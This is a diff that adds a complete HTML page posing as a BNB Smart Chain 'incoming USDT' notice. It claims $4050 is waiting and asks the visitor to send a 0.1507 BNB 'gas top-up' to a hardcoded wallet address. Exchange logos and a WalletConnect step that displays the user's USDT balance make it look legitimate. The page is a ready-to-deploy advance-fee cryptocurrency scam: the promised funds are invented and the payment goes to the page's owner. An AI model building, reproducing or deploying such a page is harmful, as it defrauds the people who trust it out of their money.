@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BNB Smart Chain USDT</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&display=swap">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #0b0e11;
+      color: #f0f0f0;
+      padding: 2rem;
+    }
+    h1 {
+      color: #fcd535;
+      text-align: center;
+    }
+    .card, .wallet-card {
+      background: #1e2329;
+      border-radius: 12px;
+      padding: 2rem;
+      width: 100%;
+      max-width: 600px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+      margin: 2rem auto;
+      text-align: center;
+    }
+    button {
+      padding: 0.75rem 1.5rem;
+      margin-top: 1rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .btn-yellow {
+      background-color: #fcd535;
+      color: #000;
+    }
+    .btn-black {
+      background-color: #000;
+      color: #fcd535;
+      border: 1px solid #fcd535;
+    }
+    .address {
+      background-color: #121416;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: monospace;
+      word-break: break-all;
+    }
+    .wallet-section {
+      margin-top: 2rem;
+    }
+    .hidden {
+      display: none;
+    }
+    .exchange-logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 1rem;
+    }
+    .exchange-logos img {
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      background: white;
+      object-fit: contain;
+    }
+    .dashboard {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-around;
+      gap: 1rem;
+    }
+    .stat-card {
+      background: #121416;
+      padding: 1.5rem;
+      border-radius: 12px;
+      flex: 1 1 45%;
+      text-align: center;
+      min-width: 200px;
+    }
+    .stat-card h2 {
+      color: #fcd535;
+    }
+  </style>
+</head>
+<body>  <h1>Incoming BNB Smart Chain USDT</h1>
+  <div class="dashboard">
+    <div class="stat-card">
+      <h2>$4050</h2>
+      <p>USDT Incoming</p>
+    </div>
+    <div class="stat-card">
+      <h2>0.1507 BNB</h2>
+      <p>Required Gas Top-Up</p>
+    </div>
+    <div class="stat-card" id="walletAddressCard">
+      <h2>-</h2>
+      <p>Your Connected Address</p>
+    </div>
+    <div class="stat-card" id="usdtBalanceCard">
+      <h2>-</h2>
+      <p>Your USDT Balance</p>
+    </div>
+  </div>  <div class="card">
+    <button class="btn-yellow" onclick="showTransactionCard()">Confirm Incoming Transaction</button>
+  </div>  <div class="wallet-card hidden" id="transactionCard">
+    <p><strong>Not Enough BNB to Import</strong></p>
+    <h2>$4050 USDT</h2>
+    <p>Please top up <strong>0.1507 BNB</strong> to your BNB Smart Chain address:</p>
+    <div class="address" id="bnbAddress">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
+    <button class="btn-black" onclick="copyAddress()">Copy Address</button><div class="wallet-section">
+  <h3>Bind Wallet via Exchange</h3>
+  <div class="exchange-logos">
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance"/>
+    <img src="https://cryptologos.cc/logos/bitget-logo.png" alt="Bitget"/>
+    <img src="https://cryptologos.cc/logos/bybit-logo.png" alt="Bybit"/>
+    <img src="https://cryptologos.cc/logos/trust-wallet-logo.png" alt="TrustWallet"/>
+    <img src="https://cryptologos.cc/logos/coinbase-logo.png" alt="Coinbase"/>
+    <img src="https://cryptologos.cc/logos/metamask-logo.png" alt="Metamask"/>
+    <img src="https://cryptologos.cc/logos/kraken-logo.png" alt="Kraken"/>
+    <img src="https://cryptologos.cc/logos/okx-logo.png" alt="OKX"/>
+    <img src="https://cryptologos.cc/logos/kucoin-logo.png" alt="Kucoin"/>
+    <img src="https://cryptologos.cc/logos/gate-io-logo.png" alt="Gate.io"/>
+    <img src="https://cryptologos.cc/logos/bitmart-logo.png" alt="Bitmart"/>
+    <img src="https://cryptologos.cc/logos/mexc-logo.png" alt="MEXC"/>
+    <img src="https://cryptologos.cc/logos/crypto-com-logo.png" alt="Crypto.com"/>
+    <img src="https://cryptologos.cc/logos/safepal-logo.png" alt="SafePal"/>
+    <img src="https://cryptologos.cc/logos/coin98-logo.png" alt="Coin98"/>
+  </div>
+  <button class="btn-yellow" onclick="connectWallet()">Bind Wallet</button>
+</div>
+
+  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>  <script>
+    const bnbAddress = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
+    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
+
+    function showTransactionCard() {
+      document.getElementById("transactionCard").classList.remove("hidden");
+    }
+
+    function copyAddress() {
+      navigator.clipboard.writeText(bnbAddress).then(() => {
+        alert("Address copied to clipboard!");
+      });
+    }
+
+    async function connectWallet() {
+      const provider = new WalletConnectProvider.default({
+        rpc: { 56: "https://bsc-dataseed.binance.org/" },
+        chainId: 56,
+        qrcode: true
+      });
+
+      try {
+        await provider.enable();
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const userAddress = accounts[0];
+
+        document.getElementById("walletAddressCard").querySelector("h2").innerText = userAddress;
+
+        const usdtABI = [
+          { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+          { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
+        ];
+
+        const contract = new web3.eth.Contract(usdtABI, usdtContract);
+        const decimals = await contract.methods.decimals().call();
+        const balance = await contract.methods.balanceOf(userAddress).call();
+        const formattedBalance = parseFloat(balance / (10 ** decimals)).toFixed(2);
+
+        document.getElementById("usdtBalanceCard").querySelector("h2").innerText = `$${formattedBalance}`;
+
+        alert("Wallet connected successfully!");
+      } catch (err) {
+        console.error("Wallet connection error:", err);
+        alert("Failed to connect wallet.");
+      }
+    }
+  </script></body>
+</html>
